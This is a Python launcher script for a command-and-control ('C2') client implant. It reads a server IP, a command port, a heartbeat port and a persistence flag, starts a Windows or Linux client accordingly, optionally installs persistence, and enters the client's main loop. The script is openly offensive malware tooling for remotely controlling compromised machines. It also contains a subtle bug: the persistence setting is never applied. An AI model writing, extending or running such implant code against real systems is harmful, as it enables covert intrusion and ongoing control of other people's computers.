import argparse
import platform

from windowsClient import WindowsClient
from linuxClient import LinuxClient
from time import sleep

DEBUG_MODE = False
SERVER_IP = ""
SERVER_PORT = 0
BEAT_PORT = 0
PERSISTENCE = False


def update_debug(args):
    if args.debug:
        global DEBUG_MODE
        DEBUG_MODE = True


def update_server_ip(args):
    global SERVER_IP
    SERVER_IP = args.ip


def update_server_port(args):
    global SERVER_PORT
    SERVER_PORT = args.port


def update_persistence(args):
    global PERSISTENCE
    PERSISTENCE = args.persistence


def update_beat_port(args):
    global BEAT_PORT
    BEAT_PORT = args.beat


def update_global_variables(args):
    update_debug(args)
    update_server_ip(args)
    update_server_port(args)
    update_beat_port(args)

def parse_args():
    parser = argparse.ArgumentParser(description='Client for the C2')
    parser.add_argument('-d', '--debug', help='Enable debug mode', default=False, action='store_true')
    parser.add_argument('--ip', help='Server IP (default: 127.0.0.1)', default='127.0.0.1', type=str)
    parser.add_argument('--port', help='Server Port (default: 8888)', default=8888, type=int)
    parser.add_argument('--beat', help='Heartbeat Port (default: 8889)', default=8889, type=int)
    parser.add_argument('--persistence', help='Enable persistence', default=False, action='store_true')
    args = parser.parse_args()
    update_global_variables(args)


if __name__ == "__main__":
    parse_args()
    if platform.system() == 'Windows':
        client = WindowsClient(SERVER_IP, SERVER_PORT, BEAT_PORT, DEBUG_MODE)
    elif platform.system() == 'Linux':
        client = LinuxClient(SERVER_IP, SERVER_PORT, BEAT_PORT, DEBUG_MODE)
    else:
        exit(1)
    if PERSISTENCE:
        client.persistence()
    client.main_loop()
